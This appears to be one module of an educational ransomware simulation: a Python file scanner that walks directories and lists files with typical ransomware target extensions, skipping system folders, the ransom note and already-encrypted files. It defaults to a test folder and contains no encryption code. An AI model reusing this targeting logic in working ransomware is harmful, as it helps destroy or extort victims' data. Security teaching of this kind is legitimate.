"""
file_scanner.py
Educational Ransomware Simulation - File System Scanner
FOR EDUCATIONAL USE ONLY - Run only in isolated VM
"""

import os
import logging
import time
from pathlib import Path

class FileScanner:
    """
    Scans directories for target files to encrypt.
    """
    
    def __init__(self, target_path=None):
        """
        Initialize the file scanner.
        
        Args:
            target_path: Specific path to scan (for safety)
        """
        self.target_path = target_path or os.path.join(os.path.expanduser("~"), "RansomwareTest")
        
        # Common ransomware target extensions
        self.target_extensions = [
            # Documents
            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.rtf', '.odt', '.ods', '.odp',
            
            # Images
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd',
            
            # Videos
            '.mp4', '.avi', '.mov', '.wmv', '.flv', '.mkv',
            
            # Audio
            '.mp3', '.wav', '.flac', '.aac',
            
            # Archives
            '.zip', '.rar', '.7z', '.tar', '.gz',
            
            # Databases
            '.sql', '.db', '.mdb', '.accdb',
            
            # Code
            '.py', '.java', '.cpp', '.cs', '.php', '.js', '.html',
        ]
        
        # Files/folders to ALWAYS ignore (safety)
        self.ignore_list = [
            'windows', 'system32', 'program files', 
            'appdata', '.snapshot', '$recycle.bin',
            'ransom_note.txt', '.demo_key.txt'
        ]
        
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        
        # Statistics
        self.stats = {
            'total_files': 0,
            'target_files': 0,
            'skipped_files': 0,
            'scanned_dirs': 0
        }
    
    def should_ignore(self, path):
        """
        Check if a path should be ignored.
        """
        path_lower = path.lower()
        
        # Check against ignore list
        for ignore in self.ignore_list:
            if ignore in path_lower:
                return True
        
        # Skip already encrypted files
        if path_lower.endswith('.encrypted'):
            return True
        
        # Skip our ransom note
        if 'ransom_note' in path_lower:
            return True
        
        return False
    
    def scan_directory(self, path=None):
        """
        Scan directory recursively for target files.
        """
        scan_path = path or self.target_path
        
        if not os.path.exists(scan_path):
            self.logger.warning(f"[WARNING] Path does not exist: {scan_path}")
            return []
        
        target_files = []
        
        self.logger.info(f"[SCAN] Starting scan of: {scan_path}")
        start_time = time.time()
        
        try:
            for root, dirs, files in os.walk(scan_path):
                self.stats['scanned_dirs'] += 1
                
                # Filter out ignored directories
                dirs[:] = [d for d in dirs if not self.should_ignore(os.path.join(root, d))]
                
                for file in files:
                    self.stats['total_files'] += 1
                    filepath = os.path.join(root, file)
                    
                    # Check if we should ignore this file
                    if self.should_ignore(filepath):
                        self.stats['skipped_files'] += 1
                        continue
                    
                    # Check file extension
                    ext = os.path.splitext(file)[1].lower()
                    if ext in self.target_extensions:
                        target_files.append(filepath)
                        self.stats['target_files'] += 1
        
        except Exception as e:
            self.logger.error(f"[ERROR] Scan failed: {e}")
        
        elapsed = time.time() - start_time
        
        self.logger.info(f"[SCAN COMPLETE] Found {len(target_files)} target files in {elapsed:.2f}s")
        return target_files
    
    def create_test_files(self):
        """
        Create sample test files for simulation.
        """
        self.logger.info("[SETUP] Creating test files...")
        
        # Create directory structure
        folders = ['documents', 'personal', 'work', 'projects']
        for folder in folders:
            folder_path = os.path.join(self.target_path, folder)
            os.makedirs(folder_path, exist_ok=True)
            
            # Create sample files
            for i in range(3):
                # Text file
                txt_path = os.path.join(folder_path, f"sample_{i+1}.txt")
                with open(txt_path, 'w') as f:
                    f.write(f"Sample document {i+1}\n")
                    f.write(f"This is test content for educational ransomware simulation.\n")
                    f.write(f"Created: {time.ctime()}\n")
                    f.write("="*50 + "\n")
                    for j in range(10):
                        f.write(f"Line {j+1}: This is sample data for encryption testing.\n")
                
                # Document file (simulated)
                doc_path = os.path.join(folder_path, f"doc_{i+1}.docx")
                with open(doc_path, 'w') as f:
                    f.write(f"Word Document Simulation - Page {i+1}\n")
                
                # Image file (simulated)
                img_path = os.path.join(folder_path, f"image_{i+1}.jpg")
                with open(img_path, 'wb') as f:
                    f.write(os.urandom(1024))  # Random binary data
        
        self.logger.info(f"[SETUP] Created test files in: {self.target_path}")
        return self.target_path